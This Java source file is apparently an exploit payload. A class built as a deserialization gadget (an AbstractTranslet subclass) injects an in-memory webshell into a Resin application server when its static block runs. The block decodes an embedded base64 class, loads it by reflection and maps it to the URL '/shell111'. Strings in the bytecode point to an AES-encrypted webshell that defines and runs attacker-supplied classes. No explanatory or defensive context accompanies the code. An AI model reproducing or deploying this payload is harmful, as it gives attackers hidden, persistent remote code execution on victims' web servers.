package com.exp;

import com.caucho.server.dispatch.ServletMapping;
import com.caucho.server.webapp.WebApp;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.Serializable;
import java.lang.reflect.Method;

public class Resin_servlet extends AbstractTranslet implements Serializable {
    static {
        try {
            Class servletInvocation = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation");
            Object httpRequetst = servletInvocation.getMethod("getContextRequest").invoke(null);
            WebApp webApp = (WebApp) httpRequetst.getClass().getMethod("getWebApp").invoke(httpRequetst);
            ServletMapping servletMapping = new ServletMapping();
            byte[] evilBytes = java.util.Base64.getDecoder().decode("yv66vgAAADQAswoALABRCwBSAFMHAFQKAAMAUQgARgoAAwBVCABICAA2CABWCABXCwBYAFkIAFoKAFsAXAcAXQoAXgBfCgAOAGAKAFsAYQgAYgoAFQBjCABkBwBlBwBBCQBmAGcKABUAaAoAaQBqBwBrCgAaAFELAFIAbAoAbQBuCgAaAG8KAFsAcAoAIgBxCgAVAHIHAHMKAGYAdAoAaQB1CgAVAHYKACIAdwcAeAoAJwB5CAB6CwB7AHwHAH0HAH4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAHExjb20vcmVzaW4vUmViZXlvbmRTZXJ2bGV0YTsBAAZkb1Bvc3QBAFIoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOylWAQAHc2Vzc2lvbgEAIExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQALcGFnZUNvbnRleHQBABNMamF2YS91dGlsL0hhc2hNYXA7AQABawEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAWMBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAZtZXRob2QBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADmV2aWxjbGFzc19ieXRlAQACW0IBAAlldmlsY2xhc3MBABFMamF2YS9sYW5nL0NsYXNzOwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQANU3RhY2tNYXBUYWJsZQcAeAEACkV4Y2VwdGlvbnMHAH8BAAVkb0dldAEAClNvdXJjZUZpbGUBABVSZWJleW9uZFNlcnZsZXRhLmphdmEMAC0ALgcAgAwAgQCCAQARamF2YS91dGlsL0hhc2hNYXAMAIMAhAEAEGU0NWUzMjlmZWI1ZDkyNWIBAAF1BwCFDACGAIcBAANBRVMHAIgMAIkAigEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMHAIsMAIwAjQwALQCODACPAJABABVqYXZhLmxhbmcuQ2xhc3NMb2FkZXIMAJEAkgEAC2RlZmluZUNsYXNzAQAPamF2YS9sYW5nL0NsYXNzBwCTDACUAEMMAJUAlgcAlwwAmACZAQAWc3VuL21pc2MvQkFTRTY0RGVjb2RlcgwAmgCbBwCcDACdAJ4MAJ8AoAwAoQCiDACjAKQMAKUApgEAEGphdmEvbGFuZy9PYmplY3QMAKcAqAwAqQCqDACrAKwMAK0ArgEAE2phdmEvbGFuZy9FeGNlcHRpb24MAK8ALgEAAS8HALAMALEAsgEAGmNvbS9yZXNpbi9SZWJleW9uZFNlcnZsZXRhAQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBAApnZXRTZXNzaW9uAQAiKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEAA3B1dAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAIcHV0VmFsdWUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEAEGphdmEvbGFuZy9TdHJpbmcBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABGluaXQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQARamF2YS9sYW5nL0ludGVnZXIBAARUWVBFAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAAlnZXRSZWFkZXIBABooKUxqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBAAhyZWFkTGluZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAMZGVjb2RlQnVmZmVyAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RvRmluYWwBAAYoW0IpW0IBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAA9wcmludFN0YWNrVHJhY2UBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEADHNlbmRSZWRpcmVjdAEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhACsALAAAAAAAAwABAC0ALgABAC8AAAAvAAEAAQAAAAUqtwABsQAAAAIAMAAAAAYAAQAAAA0AMQAAAAwAAQAAAAUAMgAzAAAAAQA0ADUAAgAvAAABvAAGAAoAAADTK7kAAgEATrsAA1m3AAQ6BBkEEgUrtgAGVxkEEgcstgAGVxkEEggttgAGVxIJOgUtEgoZBbkACwMAEgy4AA06BhkGBbsADlkZBbYADxIMtwAQtgAREhK4ABMSFAa9ABVZAxIWU1kEsgAXU1kFsgAXU7YAGDoHGQcEtgAZGQa7ABpZtwAbK7kAHAEAtgAdtgAetgAfOggZByq2ACC2ACEGvQAiWQMZCFNZBAO4ACNTWQUZCL64ACNTtgAkwAAVOgkZCbYAJRkEtgAmV6cACE4ttgAosQABAAAAygDNACcAAwAwAAAASgASAAAAEQAHABIAEAATABkAFAAiABUAKwAWAC8AFwA5ABgAQAAZAFQAGgB1ABsAewAcAJUAHQC/AB4AygAhAM0AHwDOACAA0gAiADEAAABwAAsABwDDADYANwADABAAugA4ADkABAAvAJsAOgA7AAUAQACKADwAPQAGAHUAVQA+AD8ABwCVADUAQABBAAgAvwALAEIAQwAJAM4ABABEAEUAAwAAANMAMgAzAAAAAADTAEYARwABAAAA0wBIAEkAAgBKAAAACQAC9wDNBwBLBABMAAAABAABAE0AAQBOADUAAgAvAAAASwACAAMAAAAJLBIpuQAqAgCxAAAAAgAwAAAACgACAAAAJAAIACUAMQAAACAAAwAAAAkAMgAzAAAAAAAJAEYARwABAAAACQBIAEkAAgBMAAAABAABAE0AAQBPAAAAAgBQ");
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class evilServlet = (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), evilBytes, 0, evilBytes.length);
            servletMapping.setServletClass(evilServlet.getName());
            servletMapping.setServletName(evilServlet.getName());
            servletMapping.addURLPattern("/shell111");
            webApp.addServletMapping(servletMapping);
        } catch (Exception e) {

        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}

